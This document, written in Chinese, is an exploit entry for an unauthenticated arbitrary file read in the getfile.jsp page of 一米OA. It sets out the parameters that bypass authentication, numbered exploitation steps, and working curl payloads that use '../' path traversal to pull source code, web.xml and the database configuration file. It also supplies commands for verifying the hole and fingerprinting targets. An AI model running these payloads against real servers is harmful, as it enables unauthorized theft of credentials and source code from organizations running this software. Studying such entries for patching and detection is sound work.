---
id: YIMI-FILE-READ
title: 一米OA getfile.jsp 任意文件读取漏洞
product: yimi-oa
vendor: 一米OA
version_affected: "all versions"
severity: HIGH
tags: [file_read, path_traversal, 无需认证, 国产, oa]
fingerprint: ["一米OA"]
---

## 漏洞描述

一米OA 的 getfile.jsp 文件存在任意文件读取漏洞，由于 filename 参数未对路径穿越字符进行过滤，当 prop 参数设置为 `activex` 时可绕过路径限制，攻击者通过构造 `../` 穿越即可读取服务器上的任意文件。

## 影响版本

- 一米OA（所有已知版本）

## 前置条件

- 无需认证（user 参数设置任意非空值即可绕过权限检查）
- 目标运行一米OA

## 利用步骤

1. 确认目标为一米OA
2. 设置 user 参数为任意值绕过权限检查
3. 设置 prop=activex 使路径基于 activex 目录
4. 通过 filename 参数路径穿越读取任意文件

## Payload

```bash
# 读取 getfile.jsp 自身源码
curl -s "http://target/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp"

# 读取 web.xml
curl -s "http://target/public/getfile.jsp?user=1&prop=activex&filename=../WEB-INF/web&extname=xml"

# 读取数据库配置
curl -s "http://target/public/getfile.jsp?user=1&prop=activex&filename=../WEB-INF/classes/config&extname=properties"
```

## 验证方法

```bash
curl -s "http://target/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp" | grep "getParameter\|FileOutputStream"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "一米OA"
```
